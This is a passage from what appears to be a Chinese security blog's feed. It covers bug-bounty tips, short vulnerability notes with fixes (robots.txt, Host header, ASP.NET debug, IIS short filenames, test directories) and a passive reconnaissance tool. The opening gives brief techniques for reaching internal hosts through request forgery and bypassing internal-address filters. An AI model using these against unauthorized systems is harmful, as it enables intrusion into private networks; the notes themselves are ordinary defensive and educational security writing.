判断是否服务器端发起的，再去找该厂商的内网ip或者内网域名</li><li>找到后需要遍历它内网有什么端口</li><li>如果想把它当作内网一样访问资产，可以利用fiddler配置一下就可以了。</li><li>如果它存在不让请求内网的怎么办？可以买一个域名，将域名A解析到它内网ip再做请求，或者利用302跳转，短链接等方式</li></ol><ul><li><p>bypass技巧：<a href="https://mp.weixin.qq.com/s/zIOH1nMe-Ekeo4ga2wDRgw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/zIOH1nMe-Ekeo4ga2wDRgw</a></p></li><li><p>关于考证</p></li></ul><ol><li>如果是搞渗透测试方向的话，入门建议OSCP，这是公认的全球最强渗透测试认证资质。考完了也就相当于拥有了渗透测试中级水平，完全可以应对国内大多数渗透测试岗位工作</li><li>cisp-pte、cisp-pts这类国测的证，主要是找投标资质用的，实战意义不是太大</li><li>cisp可以帮助大家更加全面的认真整个信息安全，从宏观上了解我国对于信息安全的政策和相关知识</li></ol><ul><li>[TPSA19-22]SRC行业安全测试规范：<a href="https://security.tencent.com/index.php/announcement/msg/180" target="_blank" rel="noopener">https://security.tencent.com/index.php/announcement/msg/180</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;&lt;p&gt;子域名监听工具：&lt;a href=&quot;https://github.com/guimaizi/get_domain，新出来的子域名往往漏洞较多&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/guimaizi/get_domain，新出来的子域名往往漏洞较多&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;关于挖掘src漏洞:&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;白帽子主要是寻找扫描器和风控系统覆盖不到的地方，比如domxss、越权漏洞和逻辑漏洞&lt;/li&gt;
&lt;li&gt;开发运维人员的一些疏忽的点
    
    </summary>
    
      <category term="笔记总结" scheme="https://www.teamssix.com/categories/%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="直播" scheme="https://www.teamssix.com/tags/%E7%9B%B4%E6%92%AD/"/>
    
      <category term="笔记" scheme="https://www.teamssix.com/tags/%E7%AC%94%E8%AE%B0/"/>
    
      <category term="总结" scheme="https://www.teamssix.com/tags/%E6%80%BB%E7%BB%93/"/>
    
      <category term="成长之路" scheme="https://www.teamssix.com/tags/%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/"/>
    
  </entry>
  
  <entry>
    <title>【漏洞笔记】Robots.txt站点文件</title>
    <link href="https://www.teamssix.com/year/191127-201447.html"/>
    <id>https://www.teamssix.com/year/191127-201447.html</id>
    <published>2019-11-27T12:14:47.000Z</published>
    <updated>2019-11-27T12:43:53.640Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><p>漏洞名称：Robots.txt站点文件</p><p>风险等级：低</p><p>问题类型：服务器设置问题</p><h1 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h1><p>Robots.txt文件中声明了不想被搜索引擎访问的部分或者指定搜索引擎收录指定的部分。</p><a id="more"></a><p>此信息可以帮助攻击者得到网站部分文件名称、目录名称，了解网站结构。</p><h1 id="0x02-漏洞危害"><a href="#0x02-漏洞危害" class="headerlink" title="0x02 漏洞危害"></a>0x02 漏洞危害</h1><p>攻击者可通过发现robots.txt文件，收集网站的敏感目录或文件，从而有针对性的进行利用。</p><h1 id="0x03-修复建议"><a href="#0x03-修复建议" class="headerlink" title="0x03 修复建议"></a>0x03 修复建议</h1><p>1、将敏感的文件和目录放在一个排除搜索引擎访问的目录中</p><p>2、robots.txt内容可设为Disallow: /，禁止搜索引擎访问网站的任何内容</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-概述&quot;&gt;&lt;a href=&quot;#0x00-概述&quot; class=&quot;headerlink&quot; title=&quot;0x00 概述&quot;&gt;&lt;/a&gt;0x00 概述&lt;/h1&gt;&lt;p&gt;漏洞名称：Robots.txt站点文件&lt;/p&gt;
&lt;p&gt;风险等级：低&lt;/p&gt;
&lt;p&gt;问题类型：服务器设置问题&lt;/p&gt;
&lt;h1 id=&quot;0x01-漏洞描述&quot;&gt;&lt;a href=&quot;#0x01-漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞描述&quot;&gt;&lt;/a&gt;0x01 漏洞描述&lt;/h1&gt;&lt;p&gt;Robots.txt文件中声明了不想被搜索引擎访问的部分或者指定搜索引擎收录指定的部分。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞笔记" scheme="https://www.teamssix.com/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="漏洞笔记" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
    
      <category term="Robots.txt" scheme="https://www.teamssix.com/tags/Robots-txt/"/>
    
      <category term="服务器设置问题" scheme="https://www.teamssix.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AE%BE%E7%BD%AE%E9%97%AE%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>【漏洞笔记】Host头攻击</title>
    <link href="https://www.teamssix.com/year/191127-201443.html"/>
    <id>https://www.teamssix.com/year/191127-201443.html</id>
    <published>2019-11-27T12:14:43.000Z</published>
    <updated>2019-11-27T12:43:48.304Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><p>漏洞名称：Host头攻击</p><p>风险等级：低</p><p>问题类型：管理员设置问题</p><h1 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h1><p>Host首部字段是HTTP/1.1新增的，旨在告诉服务器，客户端请求的主机名和端口号，主要用来实现虚拟主机技术。</p><a id="more"></a><p>运用虚拟主机技术，单个主机可以运行多个站点。</p><p>例如：hacker和usagidesign两个站点都运行在同一服务器A上，不管我们请求哪个域名，最终都会被解析成服务器A的IP地址，这个时候服务器就不知道该将请求交给哪个站点处理，因此需要Host字段指定请求的主机名。</p><p>我们访问hacker域名，经DNS解析，变成了服务器A的IP，请求传达到服务器A，A接收到请求后，发现请求报文中的Host字段值为hacker，进而将请求交给hacker站点处理。</p><p>这个时候，问题就出现了。为了方便获取网站域名，开发人员一般依赖于请求包中的Host首部字段。例如，在php里用_SERVER[“HTTP_HOST”]，但是这个Host字段值是不可信赖的(可通过HTTP代理工具篡改)。</p><h1 id="0x02-漏洞危害"><a href="#0x02-漏洞危害" class="headerlink" title="0x02 漏洞危害"></a>0x02 漏洞危害</h1><p>如果应用程序没有对Host字段值进行处理，就有可能造成恶意代码的传入。</p><h1 id="0x03-修复建议"><a href="#0x03-修复建议" class="headerlink" title="0x03 修复建议"></a>0x03 修复建议</h1><p>对Host字段进行检测</p><p>Nginx，修改ngnix.conf文件，在server中指定一个server_name名单，并添加检测。</p><p>Apache，修改httpd.conf文件，指定ServerName，并开启UseCanonicalName选项。</p><p>Tomcat，修改server.xml文件，配置Host的name属性。</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><blockquote><p>参考文章：<br><a href="https://www.jianshu.com/p/690acbf9f321" target="_blank" rel="noopener">https://www.jianshu.com/p/690acbf9f321</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-概述&quot;&gt;&lt;a href=&quot;#0x00-概述&quot; class=&quot;headerlink&quot; title=&quot;0x00 概述&quot;&gt;&lt;/a&gt;0x00 概述&lt;/h1&gt;&lt;p&gt;漏洞名称：Host头攻击&lt;/p&gt;
&lt;p&gt;风险等级：低&lt;/p&gt;
&lt;p&gt;问题类型：管理员设置问题&lt;/p&gt;
&lt;h1 id=&quot;0x01-漏洞描述&quot;&gt;&lt;a href=&quot;#0x01-漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞描述&quot;&gt;&lt;/a&gt;0x01 漏洞描述&lt;/h1&gt;&lt;p&gt;Host首部字段是HTTP/1.1新增的，旨在告诉服务器，客户端请求的主机名和端口号，主要用来实现虚拟主机技术。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞笔记" scheme="https://www.teamssix.com/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="漏洞笔记" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
    
      <category term="管理员设置问题" scheme="https://www.teamssix.com/tags/%E7%AE%A1%E7%90%86%E5%91%98%E8%AE%BE%E7%BD%AE%E9%97%AE%E9%A2%98/"/>
    
      <category term="Host头" scheme="https://www.teamssix.com/tags/Host%E5%A4%B4/"/>
    
  </entry>
  
  <entry>
    <title>【经验总结】常见的HTTP方法</title>
    <link href="https://www.teamssix.com/year/191127-201438.html"/>
    <id>https://www.teamssix.com/year/191127-201438.html</id>
    <published>2019-11-27T12:14:38.000Z</published>
    <updated>2019-11-27T12:43:42.903Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><p>根据HTTP标准，HTTP请求可以使用多种请求方法。</p><p>HTTP1.0定义了三种请求方法： GET, POST 和 HEAD方法。</p><p>HTTP1.1新增了六种请求方法：OPTIONS、PUT、PATCH、DELETE、TRACE 和 CONNECT方法。</p><a id="more"></a><h1 id="0x01-GET"><a href="#0x01-GET" class="headerlink" title="0x01 GET"></a>0x01 GET</h1><p>GET方法用于请求指定的页面信息，并返回实体主体。</p><h1 id="0x02-HEAD"><a href="#0x02-HEAD" class="headerlink" title="0x02 HEAD"></a>0x02 HEAD</h1><p>HEAD方法请求一个与GET请求的响应相同的响应，但没有响应体。</p><h1 id="0x03-POST"><a href="#0x03-POST" class="headerlink" title="0x03 POST"></a>0x03 POST</h1><p>向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。</p><p>数据被包含在请求体中，POST请求可能会导致新的资源建立或已有资源的修改。</p><h1 id="0x04-PUT"><a href="#0x04-PUT" class="headerlink" title="0x04 PUT"></a>0x04 PUT</h1><p>PUT方法用请求有效载荷替换目标资源的所有当前表示。</p><h1 id="0x05-DELETE"><a href="#0x05-DELETE" class="headerlink" title="0x05 DELETE"></a>0x05 DELETE</h1><p>请求服务器删除指定的页面。</p><h1 id="0x06-CONNECT"><a href="#0x06-CONNECT" class="headerlink" title="0x06 CONNECT"></a>0x06 CONNECT</h1><p>HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。</p><h1 id="0x07-OPTIONS"><a href="#0x07-OPTIONS" class="headerlink" title="0x07 OPTIONS"></a>0x07 OPTIONS</h1><p>允许客户端查看服务器的性能。</p><h1 id="0x08-TRACE"><a href="#0x08-TRACE" class="headerlink" title="0x08 TRACE"></a>0x08 TRACE</h1><p>回显服务器收到的请求，主要用于测试或诊断。</p><h1 id="0x09-PATCH"><a href="#0x09-PATCH" class="headerlink" title="0x09 PATCH"></a>0x09 PATCH</h1><p>是对PUT方法的补充，用来对已知资源进行局部更新。</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><blockquote><p>参考文章：<br><a href="https://www.runoob.com/http/http-methods.html" target="_blank" rel="noopener">https://www.runoob.com/http/http-methods.html</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-概述&quot;&gt;&lt;a href=&quot;#0x00-概述&quot; class=&quot;headerlink&quot; title=&quot;0x00 概述&quot;&gt;&lt;/a&gt;0x00 概述&lt;/h1&gt;&lt;p&gt;根据HTTP标准，HTTP请求可以使用多种请求方法。&lt;/p&gt;
&lt;p&gt;HTTP1.0定义了三种请求方法： GET, POST 和 HEAD方法。&lt;/p&gt;
&lt;p&gt;HTTP1.1新增了六种请求方法：OPTIONS、PUT、PATCH、DELETE、TRACE 和 CONNECT方法。&lt;/p&gt;
    
    </summary>
    
      <category term="经验总结" scheme="https://www.teamssix.com/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="经验总结" scheme="https://www.teamssix.com/tags/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
      <category term="HTTP方法" scheme="https://www.teamssix.com/tags/HTTP%E6%96%B9%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>【漏洞笔记】ASP.NET允许文件调试</title>
    <link href="https://www.teamssix.com/year/191126-215809.html"/>
    <id>https://www.teamssix.com/year/191126-215809.html</id>
    <published>2019-11-26T13:58:09.000Z</published>
    <updated>2019-11-26T14:21:57.058Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><p>漏洞名称：ASP.NET允许文件调试</p><p>风险等级：低</p><p>问题类型：管理员设置问题</p><h1 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h1><p>发送DEBUG动作的请求，如果服务器返回内容为OK，那么服务器就开启了调试功能，可能会导致有关Web应用程序的敏感信息泄露，例如密码、路径等。</p><a id="more"></a><h1 id="0x02-漏洞危害"><a href="#0x02-漏洞危害" class="headerlink" title="0x02 漏洞危害"></a>0x02 漏洞危害</h1><p>可能会泄露密码、路径等敏感信息。</p><h1 id="0x03-修复建议"><a href="#0x03-修复建议" class="headerlink" title="0x03 修复建议"></a>0x03 修复建议</h1><p>编辑Web.config文件，设置<code>&amp;lt;compilation debug=&quot;false&quot;/&amp;gt;</code></p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-概述&quot;&gt;&lt;a href=&quot;#0x00-概述&quot; class=&quot;headerlink&quot; title=&quot;0x00 概述&quot;&gt;&lt;/a&gt;0x00 概述&lt;/h1&gt;&lt;p&gt;漏洞名称：ASP.NET允许文件调试&lt;/p&gt;
&lt;p&gt;风险等级：低&lt;/p&gt;
&lt;p&gt;问题类型：管理员设置问题&lt;/p&gt;
&lt;h1 id=&quot;0x01-漏洞描述&quot;&gt;&lt;a href=&quot;#0x01-漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞描述&quot;&gt;&lt;/a&gt;0x01 漏洞描述&lt;/h1&gt;&lt;p&gt;发送DEBUG动作的请求，如果服务器返回内容为OK，那么服务器就开启了调试功能，可能会导致有关Web应用程序的敏感信息泄露，例如密码、路径等。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞笔记" scheme="https://www.teamssix.com/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="漏洞笔记" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
    
      <category term="ASP.NET" scheme="https://www.teamssix.com/tags/ASP-NET/"/>
    
      <category term="管理员设置问题" scheme="https://www.teamssix.com/tags/%E7%AE%A1%E7%90%86%E5%91%98%E8%AE%BE%E7%BD%AE%E9%97%AE%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>【漏洞笔记】IIS短文件名泄露</title>
    <link href="https://www.teamssix.com/year/191126-215804.html"/>
    <id>https://www.teamssix.com/year/191126-215804.html</id>
    <published>2019-11-26T13:58:04.000Z</published>
    <updated>2019-11-26T14:15:42.799Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><p>漏洞名称：IIS短文件名泄露</p><p>风险等级：低</p><p>问题类型：信息泄露</p><h1 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h1><p>此漏洞实际是由HTTP请求中旧DOS 8.3名称约定（SFN）的代字符（〜）波浪号引起的。</p><a id="more"></a><p>为了兼容16位MS-DOS程序，Windows为文件名较长的文件（和文件夹）生成了对应的windows 8.3 短文件名。</p><p>Microsoft IIS 波浪号造成的信息泄露是世界网络范围内最常见的中等风险漏洞。这个问题至少从1990年开始就已经存在，但是已经证明难以发现，难以解决或容易被完全忽略。</p><p><strong>受影响的版本：</strong><br>IIS 1.0，Windows NT 3.51<br>IIS 3.0，Windows NT 4.0 Service Pack 2<br>IIS 4.0，Windows NT 4.0选项包<br>IIS 5.0，Windows 2000<br>IIS 5.1，Windows XP Professional和Windows XP Media Center Edition<br>IIS 6.0，Windows Server 2003和Windows XP Professional x64 Edition<br>IIS 7.0，Windows Server 2008和Windows Vista<br>IIS 7.5，Windows 7（远程启用<customerrors>或没有web.config）<br>IIS 7.5，Windows 2008（经典管道模式）<br>注意：IIS使用.Net Framework 4时不受影响</customerrors></p><p><strong>漏洞的局限性：</strong><br>1) 只能猜解前六位，以及扩展名的前3位。<br>2) 名称较短的文件是没有相应的短文件名的。<br>3）需要IIS和.net两个条件都满足。</p><h1 id="0x02-漏洞危害"><a href="#0x02-漏洞危害" class="headerlink" title="0x02 漏洞危害"></a>0x02 漏洞危害</h1><p><strong>主要危害：利用“~”字符猜解暴露短文件/文件夹名</strong></p><p>由于短文件名的长度固定（xxxxxx~xxxx），因此黑客可直接对短文件名进行暴力破解 ，从而访问对应的文件。</p><p>举个例子，有一个数据库备份文件 backup_<a href="http://www.abc.com_20150101.sql" target="_blank" rel="noopener">www.abc.com_20150101.sql</a> ，它对应的短文件名是 backup<del>1.sql 。因此黑客只要暴力破解出backup</del>1.sql即可下载该文件，而无需破解完整的文件名。</p><p>*<em>次要危害：.Net Framework的拒绝服务攻击 *</em></p><p>攻击者如果在文件夹名称中发送一个不合法的.Net文件请求，.NeFramework将递归搜索所有的根目录，消耗网站资源进而导致DOS问题。</p><h1 id="0x03-修复建议"><a href="#0x03-修复建议" class="headerlink" title="0x03 修复建议"></a>0x03 修复建议</h1><p>1、CMD关闭NTFS 8.3文件格式的支持</p><p>2、修改注册表禁用短文件名功能</p><p>3、关闭Web服务扩展- ASP.NET</p><p>4、升级netFramework至4.0以上版本</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><blockquote><p>参考文章：<br><a href="https://www.freebuf.com/articles/web/172561.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/172561.html</a><br><a href="https://segmentfault.com/a/1190000006225568" target="_blank" rel="noopener">https://segmentfault.com/a/1190000006225568</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-概述&quot;&gt;&lt;a href=&quot;#0x00-概述&quot; class=&quot;headerlink&quot; title=&quot;0x00 概述&quot;&gt;&lt;/a&gt;0x00 概述&lt;/h1&gt;&lt;p&gt;漏洞名称：IIS短文件名泄露&lt;/p&gt;
&lt;p&gt;风险等级：低&lt;/p&gt;
&lt;p&gt;问题类型：信息泄露&lt;/p&gt;
&lt;h1 id=&quot;0x01-漏洞描述&quot;&gt;&lt;a href=&quot;#0x01-漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞描述&quot;&gt;&lt;/a&gt;0x01 漏洞描述&lt;/h1&gt;&lt;p&gt;此漏洞实际是由HTTP请求中旧DOS 8.3名称约定（SFN）的代字符（〜）波浪号引起的。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞笔记" scheme="https://www.teamssix.com/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="漏洞笔记" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
    
      <category term="IIS" scheme="https://www.teamssix.com/tags/IIS/"/>
    
      <category term="信息泄露" scheme="https://www.teamssix.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    
  </entry>
  
  <entry>
    <title>Pigat：一款被动信息收集聚合工具</title>
    <link href="https://www.teamssix.com/year/191126-215759.html"/>
    <id>https://www.teamssix.com/year/191126-215759.html</id>
    <published>2019-11-26T13:57:59.000Z</published>
    <updated>2019-11-26T14:49:26.511Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>Pigat即Passive Intelligence Gathering Aggregation Tool，翻译过来就是被动信息收集聚合工具，既然叫聚合工具，也就是说该工具将多款被动信息收集工具结合在了一起，进而提高了平时信息收集的效率。</p><p>早在一个月前便萌生了开发这个工具的想法，但是一直没有时间，正好最近有时间了，就简单写一下。</p><a id="more"></a><p>因为我没有太多的开发经验，所以这款工具难免存在需要改进的地方，因此希望各位大佬能够多多反馈这款工具存在的问题，一起完善这个工具。</p><h1 id="0x01-工具原理及功能概述"><a href="#0x01-工具原理及功能概述" class="headerlink" title="0x01 工具原理及功能概述"></a>0x01 工具原理及功能概述</h1><p>这款工具的原理很简单，用户输入目标url，再利用爬虫获取相关被动信息收集网站关于该url的信息，最后回显出来。</p><p>目前该工具具备8个功能，原该工具具备7个功能，分别为收集目标的资产信息、CMS信息、DNS信息、备案信息、IP地址、子域名信息、whois信息，现加入第8个功能：如果在程序中两次IP查询目标URL的结果一致，那么查询该IP的端口，即端口查询功能。</p><h1 id="0x02-工具简单上手使用"><a href="#0x02-工具简单上手使用" class="headerlink" title="0x02 工具简单上手使用"></a>0x02 工具简单上手使用</h1><h2 id="1、查看帮助信息"><a href="#1、查看帮助信息" class="headerlink" title="1、查看帮助信息"></a>1、查看帮助信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># python pigat.py -h</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/pigat1.png" alt></p><h2 id="2、指定url进行信息获取"><a href="#2、指定url进行信息获取" class="headerlink" title="2、指定url进行信息获取"></a>2、指定url进行信息获取</h2><p>如果只指定url这一个参数，没有指定其他参数，则默认获取该url的所有信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># python pigat.py -u teamssix.com</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/pigat2.png" alt></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/pigat3.png" alt></p><h2 id="3、指定url进行单项信息获取"><a href="#3、指定url进行单项信息获取" class="headerlink" title="3、指定url进行单项信息获取"></a>3、指定url进行单项信息获取</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># python pigat.py -u baidu.com --assert</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/pigat4.png" alt></p><h2 id="4、指定url进行多项信息获取"><a href="#4、指定url进行多项信息获取" class="headerlink" title="4、指定url进行多项信息获取"></a>4、指定url进行多项信息获取</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># python pigat.py -u teamssix.com --ip --cms</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/pigat5.png" alt></p><h1 id="0x03-工具获取"><a href="#0x03-工具获取" class="headerlink" title="0x03 工具获取"></a>0x03 工具获取</h1><p>关于此工具的下载地址可在我的个人公众号（TeamsSix）回复”pigat”获取。</p><h1 id="0x04-声明"><a href="#0x04-声明" class="headerlink" title="0x04 声明"></a>0x04 声明</h1><p>1、本文在FreeBuf首发，原文地址在文章尾部</p><p>2、由于我的个人疏忽，导致在FreeBuf文中获取工具的方式存在错误的地方，正确的获取方式应是回复”pigat”，而不是”pigta”，这就导致不少人及时回复了关键词也没有获取到工具地址，在这里表示深刻歉意，现在公众号后台规则已经更新，上述两个关键词均可以获取到工具地址。</p><blockquote><p>原文地址：<a href="https://www.freebuf.com/sectool/219681.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/219681.html</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;Pigat即Passive Intelligence Gathering Aggregation Tool，翻译过来就是被动信息收集聚合工具，既然叫聚合工具，也就是说该工具将多款被动信息收集工具结合在了一起，进而提高了平时信息收集的效率。&lt;/p&gt;
&lt;p&gt;早在一个月前便萌生了开发这个工具的想法，但是一直没有时间，正好最近有时间了，就简单写一下。&lt;/p&gt;
    
    </summary>
    
      <category term="工具使用" scheme="https://www.teamssix.com/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
    
      <category term="被动信息收集" scheme="https://www.teamssix.com/tags/%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
      <category term="pigat" scheme="https://www.teamssix.com/tags/pigat/"/>
    
      <category term="聚合工具" scheme="https://www.teamssix.com/tags/%E8%81%9A%E5%90%88%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>【漏洞笔记】测试目录</title>
    <link href="https://www.teamssix.com/year/191125-195302.html"/>
    <id>https://www.teamssix.com/year/191125-195302.html</id>
    <published>2019-11-25T11:53:02.000Z</published>
    <updated>2019-11-25T11:56:10.217Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><p>漏洞名称：测试目录</p><p>风险等级：低</p><p>问题类型：信息泄露</p><h1 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h1><p>Web应用程序在开发过程中，程序员为了测试代码功能，在Web目录下新建测试目录，存放测试代码，可能包含敏感信息。</p><a id="more"></a><h1 id="0x02-漏洞危害"><a href="#0x02-漏洞危害" class="headerlink" title="0x02 漏洞危害"></a>0x02 漏洞危害</h1><p>攻击者读取测试目录信息，以便进一步攻击目标站点。</p><h1 id="0x03-修复建议"><a href="#0x03-修复建议" class="headerlink" title="0x03 修复建议"></a>0x03 修复建议</h1><p>删除或者限制访问测试目录。</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-概述&quot;&gt;&lt;a href=&quot;#0x00-概述&quot; class=&quot;headerlink&quot; title=&quot;0x00 概述&quot;&gt;&lt;/a&gt;0x00 概述&lt;/h1&gt;&lt;p&gt;漏洞名称：测试目录&lt;/p&gt;
&lt;p&gt;风险等级：低&lt;/p&gt;
&lt;p&gt;问题类型：信息泄露&lt;/p&gt;
&lt;h1 id=&quot;0x01-漏洞描述&quot;&gt;&lt;a href=&quot;#0x01-漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞描述&quot;&gt;&lt;/a&gt;0x01 漏洞描述&lt;/h1&gt;&lt;p&gt;Web应用程序在开发过程中，程序员为了测试代码功能，在Web目录下新建测试目录，存放测试代码，可能包含敏感信息。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞笔记" scheme="https://www.teamssix.com/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="漏洞笔记" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
    
      <category term="信息泄露" scheme="https://www.teamssix.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    
      <category term="测试目录" scheme="https://www.teamssix.com/tags/%E6%B5%8B%E8%AF%95%E7%9B%AE%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>【漏洞笔记】测试文件</title>
    <link href="https://www.teamssix.com/year/191125-195256.html"/>
    <id>https://www.teamssix.com/year/191125-195256.html</id>
    <published>2019-11-25T11:52:56.000Z</published>
    <updated>2019-11-25T11:56:14.808Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><p>漏洞名称：测试文件</p><p>风险等级：低</p><p>问题类型：信息泄露</p><h1 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h1><p>Web应用程序在开发过程中，程序员为了测试代码功能，在Web目录下新建测试目录，存放测试代码，可能包含敏感信息。</p><a id="more"></a><h1 id="0x02-漏洞危害"><a href="#0x02-漏洞危害" class="headerlink" title="0x02 漏洞危害"></a>0x02 漏洞危害</h1><p>攻击者读取测试文件信息，可能进一步攻击目标站点。</p><h1 id="0x03-修复建议"><a href="#0x03-修复建议" class="headerlink" title="0x03 修复建议"></a>0x03 修复建议</h1><p>删除或者限制访问测试文件。</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote>]]></content>
    
    <summary type="html">
    
